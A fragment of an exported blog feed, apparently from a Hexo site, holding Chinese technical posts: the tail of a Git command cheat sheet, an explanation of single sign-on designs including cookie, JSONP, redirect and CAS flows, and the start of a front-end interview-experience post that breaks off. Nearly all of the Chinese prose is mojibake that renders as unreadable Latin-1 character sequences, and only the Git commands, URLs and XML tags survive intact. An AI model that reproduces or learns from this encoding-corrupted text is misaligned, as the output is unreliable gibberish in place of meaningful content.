â€”&gt;ä»Žç‰ˆæœ¬åº“ä¸­åˆ é™¤æ–‡ä»¶ $ git commit -m â€œæ›´æ”¹è¯´æ˜Žâ€ â€”&gt;åˆ é™¤ä¹Ÿæ˜¯éœ€è¦æäº¤çš„ä¿®æ”¹ $ git checkout â€“æ–‡ä»¶å â€”&gt;æŠŠç‰ˆæœ¬åº“ä¸­çš„æ–‡ä»¶æ›¿æ¢å½“å‰æ–‡ä»¶ï¼Œè¯¯åˆ æ¢å¤ 8.ç§»åŠ¨ git mv file_from file_to äºŒã€æ ‡ç­¾å…ˆåˆ‡æ¢åˆ°éœ€è¦æ‰“æ ‡ç­¾çš„åˆ†æ”¯ä¸Š $ git tag æ ‡ç­¾åå­— æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ $ git tag ç»™åŽ†å²æäº¤æ‰“æ ‡ç­¾ $ git tag æ ‡ç­¾åå­— commit_id æ˜¾ç¤ºæ ‡ç­¾åˆ†æ”¯çš„ä¿¡æ¯ $ git show æ ‡ç­¾åå­— è¿˜å¯ä»¥é€šè¿‡-sç”¨ç§é’¥ç­¾åä¸€ä¸ªæ ‡ç­¾ï¼š $ git tag -s v0.2 -m â€œsigned version 0.2 releasedâ€ fec145a å¦‚æžœæ ‡ç­¾æ‰“é”™äº†ï¼Œä¹Ÿå¯ä»¥åˆ é™¤ $ git tag -d æ ‡ç­¾åå­— å› ä¸ºåˆ›å»ºçš„æ ‡ç­¾éƒ½åªå­˜å‚¨åœ¨æœ¬åœ°ï¼Œä¸ä¼šè‡ªåŠ¨æŽ¨é€åˆ°è¿œç¨‹ã€‚å¦‚æžœè¦æŽ¨é€æŸä¸ªæ ‡ç­¾åˆ°è¿œç¨‹ï¼Œä½¿ç”¨å‘½ä»¤ $ git push origin æ ‡ç­¾å ä¸€æ¬¡æ€§æŽ¨é€å…¨éƒ¨å°šæœªæŽ¨é€åˆ°è¿œç¨‹çš„æœ¬åœ°æ ‡ç­¾ $ git push origin â€“tags ä¸‰ã€è¿œç¨‹ä»“åº“1. åˆ›å»ºSSH Key $ ssh-keygen -t rsa -C â€œç”¨æˆ·é‚®ç®±â€ å¯åœ¨ç”¨æˆ·ä¸»ç›®å½•é‡Œæ‰¾åˆ°.sshç›®å½•ï¼Œé‡Œé¢æœ‰id_rsaå’Œid_rsa.pubä¸¤ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªå°±æ˜¯SSH Keyçš„ç§˜é’¥å¯¹ï¼Œid_rsaæ˜¯ç§é’¥ï¼Œä¸èƒ½æ³„éœ²å‡ºåŽ»ï¼Œid_rsa.pubæ˜¯å…¬é’¥ï¼Œå¯ä»¥æ”¾å¿ƒåœ°å‘Šè¯‰ä»»ä½•äººã€‚ 2. ç»‘å®šGitHubç™»é™†GitHubï¼Œæ‰“å¼€â€œAccount settingsâ€ï¼Œâ€œSSH Keysâ€é¡µé¢ï¼šç„¶åŽï¼Œç‚¹â€œAdd SSH Keyâ€ï¼Œå¡«ä¸Šä»»æ„Titleï¼Œåœ¨Keyæ–‡æœ¬æ¡†é‡Œç²˜è´´id_rsa.pubæ–‡ä»¶çš„å†…å®¹ã€‚ 3. ç»‘å®šåº“åœ¨GitHubä¸Šåˆ›å»ºä¸€ä¸ªæ–°åº“ä¹‹åŽï¼Œæœ¬åœ°ç”¨gitä¸Šä¼ å†…å®¹ $ git remote add origin git@github.com:GitHubç”¨æˆ·å/åº“å.git æ·»åŠ ä¸Šæ¸¸ $git remote add upstream https://github.com/GitHubç”¨æˆ·å/åº“å.git æŸ¥çœ‹è¿œç¨‹åº“çš„ä¿¡æ¯ $ git remote -v 4.æŽ¨é€æœ¬åœ°åº“å†…å®¹æŠŠæœ¬åœ°åº“çš„å†…å®¹æŽ¨é€åˆ°è¿œç¨‹ï¼Œç”¨git pushå‘½ä»¤æŠŠå½“å‰åˆ†æ”¯masteræŽ¨é€åˆ°è¿œç¨‹ã€‚ $ git push -u origin master ç”±äºŽè¿œç¨‹åº“æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡æŽ¨é€masteråˆ†æ”¯æ—¶ï¼ŒåŠ ä¸Šäº†-uå‚æ•°ï¼ŒGitä¸ä½†ä¼šæŠŠæœ¬åœ°çš„masteråˆ†æ”¯å†…å®¹æŽ¨é€çš„è¿œç¨‹æ–°çš„masteråˆ†æ”¯ï¼Œè¿˜ä¼šæŠŠæœ¬åœ°çš„masteråˆ†æ”¯å’Œè¿œç¨‹çš„masteråˆ†æ”¯å…³è”èµ·æ¥ï¼Œåœ¨ä»¥åŽçš„æŽ¨é€æˆ–è€…æ‹‰å–æ—¶å°±å¯ä»¥ç®€åŒ–å‘½ä»¤ã€‚æŽ¨é€æˆåŠŸåŽï¼Œå¯ä»¥ç«‹åˆ»åœ¨GitHubé¡µé¢ä¸­çœ‹åˆ°è¿œç¨‹åº“çš„å†…å®¹å·²ç»å’Œæœ¬åœ°ä¸€æ¨¡ä¸€æ ·ã€‚ 5.å…‹éš†è¿œç¨‹åº“å†…å®¹ $ git clone git@github.com:GitHubç”¨æˆ·å/åº“å.git (æ–‡ä»¶å) 6.æŠ“å–è¿œç¨‹åº“å†…å®¹ $ git fetch è¿™ä¸ªå‘½ä»¤ä¼šè®¿é—®è¿œç¨‹ä»“åº“ï¼Œä»Žä¸­æ‹‰å–æ‰€æœ‰ä½ è¿˜æ²¡æœ‰çš„æ•°æ®ã€‚ æ‰§è¡Œå®ŒæˆåŽï¼Œä½ å°†ä¼šæ‹¥æœ‰é‚£ä¸ªè¿œç¨‹ä»“åº“ä¸­æ‰€æœ‰åˆ†æ”¯çš„å¼•ç”¨ï¼Œå¯ä»¥éšæ—¶åˆå¹¶æˆ–æŸ¥çœ‹ã€‚ å¦‚æžœä½ ä½¿ç”¨ clone å‘½ä»¤å…‹éš†äº†ä¸€ä¸ªä»“åº“ï¼Œå‘½ä»¤ä¼šè‡ªåŠ¨å°†å…¶æ·»åŠ ä¸ºè¿œç¨‹ä»“åº“å¹¶é»˜è®¤ä»¥ â€œoriginâ€ ä¸ºç®€å†™ã€‚ æ‰€ä»¥ï¼Œgit fetch origin ä¼šæŠ“å–å…‹éš†ï¼ˆæˆ–ä¸Šä¸€æ¬¡æŠ“å–ï¼‰åŽæ–°æŽ¨é€çš„æ‰€æœ‰å·¥ä½œã€‚ å¿…é¡»æ³¨æ„ git fetch å‘½ä»¤ä¼šå°†æ•°æ®æ‹‰å–åˆ°ä½ çš„æœ¬åœ°ä»“åº“ - å®ƒå¹¶ä¸ä¼šè‡ªåŠ¨åˆå¹¶æˆ–ä¿®æ”¹ä½ å½“å‰çš„å·¥ä½œã€‚ å½“å‡†å¤‡å¥½æ—¶ä½ å¿…é¡»æ‰‹åŠ¨å°†å…¶åˆå¹¶å…¥ä½ çš„å·¥ä½œã€‚ å››ã€åˆ†æ”¯ç®¡ç†masteråˆ†æ”¯æ˜¯ä¸€æ¡çº¿ï¼ŒGitç”¨masteræŒ‡å‘æœ€æ–°çš„æäº¤ï¼Œå†ç”¨HEADæŒ‡å‘masterï¼Œå°±èƒ½ç¡®å®šå½“å‰åˆ†æ”¯ï¼Œä»¥åŠå½“å‰åˆ†æ”¯çš„æäº¤ç‚¹ å½“æˆ‘ä»¬åˆ›å»ºæ–°çš„åˆ†æ”¯ï¼Œä¾‹å¦‚devæ—¶ï¼ŒGitæ–°å»ºäº†ä¸€ä¸ªæŒ‡é’ˆå«devï¼ŒæŒ‡å‘masterç›¸åŒçš„æäº¤ï¼Œå†æŠŠHEADæŒ‡å‘devï¼Œå°±è¡¨ç¤ºå½“å‰åˆ†æ”¯åœ¨devä¸Šï¼šé¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºdevåˆ†æ”¯ï¼Œç„¶åŽåˆ‡æ¢åˆ°devåˆ†æ”¯ï¼š $ git checkout -b dev å‘½ä»¤åŠ ä¸Š-bå‚æ•°è¡¨ç¤ºåˆ›å»ºå¹¶åˆ‡æ¢ï¼Œç›¸å½“äºŽä»¥ä¸‹ä¸¤æ¡å‘½ä»¤ï¼š $ git branch dev $ git checkout dev æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯(å½“å‰åˆ†æ”¯å‰é¢ä¼šæ ‡ä¸€ä¸ª*å·) $ git branch åˆ‡æ¢å›žmasteråˆ†æ”¯ï¼š $ git checkout master æŠŠdevåˆ†æ”¯çš„å·¥ä½œæˆæžœåˆå¹¶åˆ°å½“å‰åˆ†æ”¯ä¸Šï¼š $ git merge -m â€œåˆå¹¶è¯´æ˜Žâ€ dev åˆ é™¤devåˆ†æ”¯ $ git branch -d dev æŸ¥çœ‹åˆ†æ”¯åˆå¹¶å›¾ $ git log â€“graph ä»¥å›¾å½¢åŒ–çš„æ–¹å¼å±•çŽ°æäº¤çš„æ—¥å¿— $gitk æš‚æ—¶åˆ†æ”¯ï¼ˆå½“æ‰‹å¤´å·¥ä½œæ²¡æœ‰å®Œæˆæ—¶ï¼Œå…ˆæŠŠå·¥ä½œçŽ°åœºgit stashä¸€ä¸‹ï¼Œç„¶åŽåŽ»ä¿®å¤bugï¼Œä¿®å¤åŽï¼Œå†git stash popï¼Œå›žåˆ°å·¥ä½œçŽ°åœºã€‚ï¼‰ $ git stash â€”&gt;åˆ›å»ºæš‚æ—¶åˆ†æ”¯ä¿å­˜å½“å‰å·¥ä½œåŒºå†…å®¹ $ git stash apply â€”&gt;æ¢å¤æš‚æ—¶åˆ†æ”¯ $ git stash drop â€”&gt;åˆ é™¤æš‚æ—¶åˆ†æ”¯ $ git stash pop â€”&gt;æ¢å¤å¹¶åˆ é™¤æš‚æ—¶åˆ†æ”¯ $ git stash list â€”&gt;æŸ¥çœ‹æ‰€æœ‰æš‚æ—¶åˆ†æ”¯ å‚è€ƒèµ„æ–™http://blog.jobbole.com/111187/https://zhuanlan.zhihu.com/p/45724857]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FSSO%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å•ç‚¹ç™»å½•å•ç‚¹ç™»å½•ï¼ˆSingle Sign Onï¼‰ï¼Œç®€ç§°ä¸º SSOï¼Œæ˜¯ç›®å‰æ¯”è¾ƒæµè¡Œçš„ä¼ä¸šä¸šåŠ¡æ•´åˆçš„è§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚SSOçš„å®šä¹‰æ˜¯åœ¨å¤šä¸ªåº”ç”¨ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·åªéœ€è¦ç™»å½•ä¸€æ¬¡å°±å¯ä»¥è®¿é—®æ‰€æœ‰ç›¸äº’ä¿¡ä»»çš„åº”ç”¨ç³»ç»Ÿã€‚ å®žçŽ°å•ç‚¹ç™»å½•è¯´åˆ°åº•å°±æ˜¯è¦è§£å†³å¦‚ä½•äº§ç”Ÿå’Œå­˜å‚¨é‚£ä¸ªä¿¡ä»»ï¼Œå†å°±æ˜¯å…¶ä»–ç³»ç»Ÿå¦‚ä½•éªŒè¯è¿™ä¸ªä¿¡ä»»çš„æœ‰æ•ˆæ€§ï¼Œå› æ­¤è¦ç‚¹ä¹Ÿå°±ä»¥ä¸‹ä¸¤ä¸ªï¼š å­˜å‚¨ä¿¡ä»» éªŒè¯ä¿¡ä»» å¦‚æžœä¸€ä¸ªç³»ç»Ÿåšåˆ°äº†å¼€å¤´æ‰€è®²çš„æ•ˆæžœï¼Œä¹Ÿå°±ç®—å•ç‚¹ç™»å½•ï¼Œå•ç‚¹ç™»å½•æœ‰ä¸åŒçš„å®žçŽ°æ–¹å¼ï¼Œæœ¬æ–‡å°±ç½—åˆ—æˆ‘å¼€å‘ä¸­æ‰€é‡è§è¿‡çš„å®žçŽ°æ–¹å¼ã€‚ ä»¥Cookieä½œä¸ºå‡­è¯åª’ä»‹æœ€ç®€å•çš„å•ç‚¹ç™»å½•å®žçŽ°æ–¹å¼ï¼Œæ˜¯ä½¿ç”¨cookieä½œä¸ºåª’ä»‹ï¼Œå­˜æ”¾ç”¨æˆ·å‡­è¯ã€‚ç”¨æˆ·ç™»å½•çˆ¶åº”ç”¨ä¹‹åŽï¼Œåº”ç”¨è¿”å›žä¸€ä¸ªåŠ å¯†çš„cookieï¼Œå½“ç”¨æˆ·è®¿é—®å­åº”ç”¨çš„æ—¶å€™ï¼Œæºå¸¦ä¸Šè¿™ä¸ªcookieï¼ŒæŽˆæƒåº”ç”¨è§£å¯†cookieå¹¶è¿›è¡Œæ ¡éªŒï¼Œæ ¡éªŒé€šè¿‡åˆ™ç™»å½•å½“å‰ç”¨æˆ·ã€‚ ä»¥ä¸Šæ–¹å¼æŠŠä¿¡ä»»å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„Cookieä¸­ï¼Œè¿™ç§æ–¹å¼å¾ˆå®¹æ˜“ä»¤äººè´¨ç–‘ï¼š Cookieä¸å®‰å…¨ ä¸èƒ½è·¨åŸŸå®žçŽ°å…ç™» å¯¹äºŽç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œé€šè¿‡åŠ å¯†Cookieå¯ä»¥ä¿è¯å®‰å…¨æ€§ï¼Œå½“ç„¶è¿™æ˜¯åœ¨æºä»£ç ä¸æ³„éœ²çš„å‰æä¸‹ã€‚å¦‚æžœCookieçš„åŠ å¯†ç®—æ³•æ³„éœ²ï¼Œæ”»å‡»è€…é€šè¿‡ä¼ªé€ Cookieåˆ™å¯ä»¥ä¼ªé€ ç‰¹å®šç”¨æˆ·èº«ä»½ï¼Œè¿™æ˜¯å¾ˆå±é™©çš„ã€‚å¯¹äºŽç¬¬äºŒä¸ªé—®é¢˜ï¼Œæ›´æ˜¯ç¡¬ä¼¤ã€‚ é€šè¿‡JSONPå®žçŽ°å¯¹äºŽè·¨åŸŸé—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨JSONPå®žçŽ°ã€‚ç”¨æˆ·åœ¨çˆ¶åº”ç”¨ä¸­ç™»å½•åŽï¼Œè·ŸSessionåŒ¹é…çš„Cookieä¼šå­˜åˆ°å®¢æˆ·ç«¯ä¸­ï¼Œå½“ç”¨æˆ·éœ€è¦ç™»å½•å­åº”ç”¨çš„æ—¶å€™ï¼ŒæŽˆæƒåº”ç”¨è®¿é—®çˆ¶åº”ç”¨æä¾›çš„JSONPæŽ¥å£ï¼Œå¹¶åœ¨è¯·æ±‚ä¸­å¸¦ä¸Šçˆ¶åº”ç”¨åŸŸåä¸‹çš„Cookieï¼Œçˆ¶åº”ç”¨æŽ¥æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œè¿”å›žåŠ å¯†çš„ä¿¡æ¯ï¼Œå­åº”ç”¨é€šè¿‡è§£æžè¿”å›žæ¥çš„åŠ å¯†ä¿¡æ¯æ¥éªŒè¯ç”¨æˆ·ï¼Œå¦‚æžœé€šè¿‡éªŒè¯åˆ™ç™»å½•ç”¨æˆ·ã€‚ è¿™ç§æ–¹å¼è™½ç„¶èƒ½è§£å†³è·¨åŸŸé—®é¢˜ï¼Œä½†æ˜¯å®‰å…¨æ€§å…¶å®žè·ŸæŠŠä¿¡ä»»å­˜å‚¨åˆ°Cookieæ˜¯å·®ä¸å¤šçš„ã€‚å¦‚æžœä¸€æ—¦åŠ å¯†ç®—æ³•æ³„éœ²äº†ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœ¬åœ°å»ºç«‹ä¸€ä¸ªå®žçŽ°äº†ç™»å½•æŽ¥å£çš„å‡å†’çˆ¶åº”ç”¨ï¼Œé€šè¿‡ç»‘å®šHostæ¥æŠŠå­åº”ç”¨å‘èµ·çš„è¯·æ±‚æŒ‡å‘æœ¬åœ°çš„å‡å†’çˆ¶åº”ç”¨ï¼Œå¹¶ä½œå‡ºå›žåº”ã€‚å› ä¸ºæ”»å‡»è€…å®Œå…¨å¯ä»¥æŒ‰ç…§åŠ å¯†ç®—æ³•æ¥ä¼ªé€ å“åº”è¯·æ±‚ï¼Œå­åº”ç”¨æŽ¥æ”¶åˆ°è¿™ä¸ªå“åº”ä¹‹åŽä¸€æ ·å¯ä»¥é€šè¿‡éªŒè¯ï¼Œå¹¶ä¸”ç™»å½•ç‰¹å®šç”¨æˆ·ã€‚ é€šè¿‡é¡µé¢é‡å®šå‘çš„æ–¹å¼æœ€åŽä¸€ç§ä»‹ç»çš„æ–¹å¼ï¼Œæ˜¯é€šè¿‡çˆ¶åº”ç”¨å’Œå­åº”ç”¨æ¥å›žé‡å®šå‘ä¸­è¿›è¡Œé€šä¿¡ï¼Œå®žçŽ°ä¿¡æ¯çš„å®‰å…¨ä¼ é€’ã€‚çˆ¶åº”ç”¨æä¾›ä¸€ä¸ªGETæ–¹å¼çš„ç™»å½•æŽ¥å£ï¼Œç”¨æˆ·é€šè¿‡å­åº”ç”¨é‡å®šå‘è¿žæŽ¥çš„æ–¹å¼è®¿é—®è¿™ä¸ªæŽ¥å£ï¼Œå¦‚æžœç”¨æˆ·è¿˜æ²¡æœ‰ç™»å½•ï¼Œåˆ™è¿”å›žä¸€ä¸ªçš„ç™»å½•é¡µé¢ï¼Œç”¨æˆ·è¾“å…¥è´¦å·å¯†ç è¿›è¡Œç™»å½•ã€‚å¦‚æžœç”¨æˆ·å·²ç»ç™»å½•äº†ï¼Œåˆ™ç”ŸæˆåŠ å¯†çš„Tokenï¼Œå¹¶ä¸”é‡å®šå‘åˆ°å­åº”ç”¨æä¾›çš„éªŒè¯Tokençš„æŽ¥å£ï¼Œé€šè¿‡è§£å¯†å’Œæ ¡éªŒä¹‹åŽï¼Œå­åº”ç”¨ç™»å½•å½“å‰ç”¨æˆ·ã€‚ åŒåŸŸä¸‹çš„å•ç‚¹ç™»å½•ä¸€ä¸ªä¼ä¸šä¸€èˆ¬æƒ…å†µä¸‹åªæœ‰ä¸€ä¸ªåŸŸåï¼Œé€šè¿‡äºŒçº§åŸŸååŒºåˆ†ä¸åŒçš„ç³»ç»Ÿã€‚æ¯”å¦‚æˆ‘ä»¬æœ‰ä¸ªåŸŸåå«åšï¼ša.comï¼ŒåŒæ—¶æœ‰ä¸¤ä¸ªä¸šåŠ¡ç³»ç»Ÿåˆ†åˆ«ä¸ºï¼šapp1.a.comå’Œapp2.a.comã€‚æˆ‘ä»¬è¦åšå•ç‚¹ç™»å½•ï¼ˆSSOï¼‰ï¼Œéœ€è¦ä¸€ä¸ªç™»å½•ç³»ç»Ÿï¼Œå«åšï¼šsso.a.comã€‚ æˆ‘ä»¬åªè¦åœ¨sso.a.comç™»å½•ï¼Œapp1.a.comå’Œapp2.a.comå°±ä¹Ÿç™»å½•äº†ã€‚é€šè¿‡ä¸Šé¢çš„ç™»é™†è®¤è¯æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåœ¨sso.a.comä¸­ç™»å½•äº†ï¼Œå…¶å®žæ˜¯åœ¨sso.a.comçš„æœåŠ¡ç«¯çš„sessionä¸­è®°å½•äº†ç™»å½•çŠ¶æ€ï¼ŒåŒæ—¶åœ¨æµè§ˆå™¨ç«¯ï¼ˆBrowserï¼‰çš„sso.a.comä¸‹å†™å…¥äº†Cookieã€‚é‚£ä¹ˆæˆ‘ä»¬æ€Žä¹ˆæ‰èƒ½è®©app1.a.comå’Œapp2.a.comç™»å½•å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š Cookieæ˜¯ä¸èƒ½è·¨åŸŸçš„ï¼Œæˆ‘ä»¬Cookieçš„domainå±žæ€§æ˜¯sso.a.comï¼Œåœ¨ç»™app1.a.comå’Œapp2.a.comå‘é€è¯·æ±‚æ˜¯å¸¦ä¸ä¸Šçš„ã€‚ ssoã€app1å’Œapp2æ˜¯ä¸åŒçš„åº”ç”¨ï¼Œå®ƒä»¬çš„sessionå­˜åœ¨è‡ªå·±çš„åº”ç”¨å†…ï¼Œæ˜¯ä¸å…±äº«çš„ã€‚ é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è§£å†³è¿™ä¸¤ä¸ªé—®é¢˜å‘¢ï¼Ÿé’ˆå¯¹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œssoç™»å½•ä»¥åŽï¼Œå¯ä»¥å°†Cookieçš„åŸŸè®¾ç½®ä¸ºé¡¶åŸŸï¼Œå³.a.comï¼Œè¿™æ ·æ‰€æœ‰å­åŸŸçš„ç³»ç»Ÿéƒ½å¯ä»¥è®¿é—®åˆ°é¡¶åŸŸçš„Cookieã€‚æˆ‘ä»¬åœ¨è®¾ç½®Cookieæ—¶ï¼Œåªèƒ½è®¾ç½®é¡¶åŸŸå’Œè‡ªå·±çš„åŸŸï¼Œä¸èƒ½è®¾ç½®å…¶ä»–çš„åŸŸã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬ä¸èƒ½åœ¨è‡ªå·±çš„ç³»ç»Ÿä¸­ç»™baidu.comçš„åŸŸè®¾ç½®Cookieã€‚ Cookieçš„é—®é¢˜è§£å†³äº†ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹sessionçš„é—®é¢˜ã€‚æˆ‘ä»¬åœ¨ssoç³»ç»Ÿç™»å½•äº†ï¼Œè¿™æ—¶å†è®¿é—®app1ï¼ŒCookieä¹Ÿå¸¦åˆ°äº†app1çš„æœåŠ¡ç«¯ï¼ˆServerï¼‰ï¼Œapp1çš„æœåŠ¡ç«¯æ€Žä¹ˆæ‰¾åˆ°è¿™ä¸ªCookieå¯¹åº”çš„Sessionå‘¢ï¼Ÿè¿™é‡Œå°±è¦æŠŠ3ä¸ªç³»ç»Ÿçš„Sessionå…±äº«ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚å…±äº«Sessionçš„è§£å†³æ–¹æ¡ˆæœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ï¼šSpring-Sessionã€‚è¿™æ ·ç¬¬2ä¸ªé—®é¢˜ä¹Ÿè§£å†³äº†ã€‚ åŒåŸŸä¸‹çš„å•ç‚¹ç™»å½•å°±å®žçŽ°äº†ï¼Œä½†è¿™è¿˜ä¸æ˜¯çœŸæ­£çš„å•ç‚¹ç™»å½•ã€‚ ä¸åŒåŸŸä¸‹çš„å•ç‚¹ç™»å½•åŒåŸŸä¸‹çš„å•ç‚¹ç™»å½•æ˜¯å·§ç”¨äº†Cookieé¡¶åŸŸçš„ç‰¹æ€§ã€‚å¦‚æžœæ˜¯ä¸åŒåŸŸå‘¢ï¼Ÿä¸åŒåŸŸä¹‹é—´Cookieæ˜¯ä¸å…±äº«çš„ï¼Œæ€Žä¹ˆåŠžï¼Ÿ è¿™é‡Œæˆ‘ä»¬å°±è¦è¯´ä¸€è¯´CASæµç¨‹äº†ï¼Œè¿™ä¸ªæµç¨‹æ˜¯å•ç‚¹ç™»å½•çš„æ ‡å‡†æµç¨‹ã€‚ ä¸Šå›¾æ˜¯CASå®˜ç½‘ä¸Šçš„æ ‡å‡†æµç¨‹ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š ç”¨æˆ·è®¿é—®appç³»ç»Ÿï¼Œappç³»ç»Ÿæ˜¯éœ€è¦ç™»å½•çš„ï¼Œä½†ç”¨æˆ·çŽ°åœ¨æ²¡æœ‰ç™»å½•ã€‚ è·³è½¬åˆ°CAS serverï¼Œå³SSOç™»å½•ç³»ç»Ÿï¼Œä»¥åŽå›¾ä¸­çš„CAS Serveræˆ‘ä»¬ç»Ÿä¸€å«åšSSOç³»ç»Ÿã€‚ SSOç³»ç»Ÿä¹Ÿæ²¡æœ‰ç™»å½•ï¼Œå¼¹å‡ºç”¨æˆ·ç™»å½•é¡µã€‚ ç”¨æˆ·å¡«å†™ç”¨æˆ·åã€å¯†ç ï¼ŒSSOç³»ç»Ÿè¿›è¡Œè®¤è¯åŽï¼Œå°†ç™»å½•çŠ¶æ€å†™å…¥SSOçš„sessionï¼Œæµè§ˆå™¨ï¼ˆBrowserï¼‰ä¸­å†™å…¥SSOåŸŸä¸‹çš„Cookieã€‚ SSOç³»ç»Ÿç™»å½•å®ŒæˆåŽä¼šç”Ÿæˆä¸€ä¸ªSTï¼ˆService Ticketï¼‰ï¼Œç„¶åŽè·³è½¬åˆ°appç³»ç»Ÿï¼ŒåŒæ—¶å°†STä½œä¸ºå‚æ•°ä¼ é€’ç»™appç³»ç»Ÿã€‚ appç³»ç»Ÿæ‹¿åˆ°STåŽï¼Œä»ŽåŽå°å‘SSOå‘é€è¯·æ±‚ï¼ŒéªŒè¯STæ˜¯å¦æœ‰æ•ˆã€‚ éªŒè¯é€šè¿‡åŽï¼Œappç³»ç»Ÿå°†ç™»å½•çŠ¶æ€å†™å…¥sessionå¹¶è®¾ç½®appåŸŸä¸‹çš„Cookieã€‚ è‡³æ­¤ï¼Œè·¨åŸŸå•ç‚¹ç™»å½•å°±å®Œæˆäº†ã€‚ä»¥åŽæˆ‘ä»¬å†è®¿é—®appç³»ç»Ÿæ—¶ï¼Œappå°±æ˜¯ç™»å½•çš„ã€‚æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†çœ‹çœ‹è®¿é—®app2ç³»ç»Ÿæ—¶çš„æµç¨‹ã€‚ ç”¨æˆ·è®¿é—®app2ç³»ç»Ÿï¼Œapp2ç³»ç»Ÿæ²¡æœ‰ç™»å½•ï¼Œè·³è½¬åˆ°SSOã€‚ ç”±äºŽSSOå·²ç»ç™»å½•äº†ï¼Œä¸éœ€è¦é‡æ–°ç™»å½•è®¤è¯ã€‚ SSOç”ŸæˆSTï¼Œæµè§ˆå™¨è·³è½¬åˆ°app2ç³»ç»Ÿï¼Œå¹¶å°†STä½œä¸ºå‚æ•°ä¼ é€’ç»™app2ã€‚ app2æ‹¿åˆ°STï¼ŒåŽå°è®¿é—®SSOï¼ŒéªŒè¯STæ˜¯å¦æœ‰æ•ˆã€‚ éªŒè¯æˆåŠŸåŽï¼Œapp2å°†ç™»å½•çŠ¶æ€å†™å…¥sessionï¼Œå¹¶åœ¨app2åŸŸä¸‹å†™å…¥Cookieã€‚ è¿™æ ·ï¼Œapp2ç³»ç»Ÿä¸éœ€è¦èµ°ç™»å½•æµç¨‹ï¼Œå°±å·²ç»æ˜¯ç™»å½•äº†ã€‚SSOï¼Œappå’Œapp2åœ¨ä¸åŒçš„åŸŸï¼Œå®ƒä»¬ä¹‹é—´çš„sessionä¸å…±äº«ä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ã€‚ æœ‰çš„åŒå­¦é—®æˆ‘ï¼ŒSSOç³»ç»Ÿç™»å½•åŽï¼Œè·³å›žåŽŸä¸šåŠ¡ç³»ç»Ÿæ—¶ï¼Œå¸¦äº†ä¸ªå‚æ•°STï¼Œä¸šåŠ¡ç³»ç»Ÿè¿˜è¦æ‹¿STå†æ¬¡è®¿é—®SSOè¿›è¡ŒéªŒè¯ï¼Œè§‰å¾—è¿™ä¸ªæ­¥éª¤æœ‰ç‚¹å¤šä½™ã€‚ä»–æƒ³SSOç™»å½•è®¤è¯é€šè¿‡åŽï¼Œé€šè¿‡å›žè°ƒåœ°å€å°†ç”¨æˆ·ä¿¡æ¯è¿”å›žç»™åŽŸä¸šåŠ¡ç³»ç»Ÿï¼ŒåŽŸä¸šåŠ¡ç³»ç»Ÿç›´æŽ¥è®¾ç½®ç™»å½•çŠ¶æ€ï¼Œè¿™æ ·æµç¨‹ç®€å•ï¼Œä¹Ÿå®Œæˆäº†ç™»å½•ï¼Œä¸æ˜¯å¾ˆå¥½å—ï¼Ÿ å…¶å®žè¿™æ ·é—®é¢˜æ—¶å¾ˆä¸¥é‡çš„ï¼Œå¦‚æžœæˆ‘åœ¨SSOæ²¡æœ‰ç™»å½•ï¼Œè€Œæ˜¯ç›´æŽ¥åœ¨æµè§ˆå™¨ä¸­æ•²å…¥å›žè°ƒçš„åœ°å€ï¼Œå¹¶å¸¦ä¸Šä¼ªé€ çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæ˜¯ä¸æ˜¯ä¸šåŠ¡ç³»ç»Ÿä¹Ÿè®¤ä¸ºç™»å½•äº†å‘¢ï¼Ÿè¿™æ˜¯å¾ˆå¯æ€•çš„ã€‚ https://blog.csdn.net/qq_39089301/article/details/80615348 https://blog.csdn.net/qq_39089301/article/details/80615348]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_experience%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å‰ç«¯é¢è¯•åŽ†ç¨‹2019.0707.28å¤šç›Š-æŠ•é€’1.è°ˆä¸€è°ˆå¯¹å‰ç«¯å¼€å‘çš„ç†è§£ï¼Œéœ€è¦å…·å¤‡å“ªäº›çŸ¥è¯†å’ŒæŠ€æœ¯ï¼Ÿä½ æ“…é•¿å“ªæ–¹é¢ï¼Ÿ è¿ç”¨HTMLã€CSSã€JavaScriptæŠ€æœ¯ï¼Œé€šè¿‡reactã€vueç­‰æ¡†æž¶å®žçŽ°å‰å°äº¤äº’é¡µé¢ï¼ˆç½‘é¡µã€å°ç¨‹åºï¼‰ï¼Œç»™ç”¨æˆ·è‰¯å¥½çš„äº¤äº’ä½“éªŒã€‚å¹¶ä½œä¸ºç”¨æˆ·åˆ°åŽå°çš„ä¸­ä»‹ï¼Œå®Œæˆæ•°æ®çš„æ”¶é›†ã€ä¼ é€’ä¸Žå±•ç¤ºã€‚æ“…é•¿é¡µé¢çš„å®žçŽ°ä»¥åŠæ€§èƒ½ä¼˜åŒ–ã€‚ 2.é˜è¿°ä½ 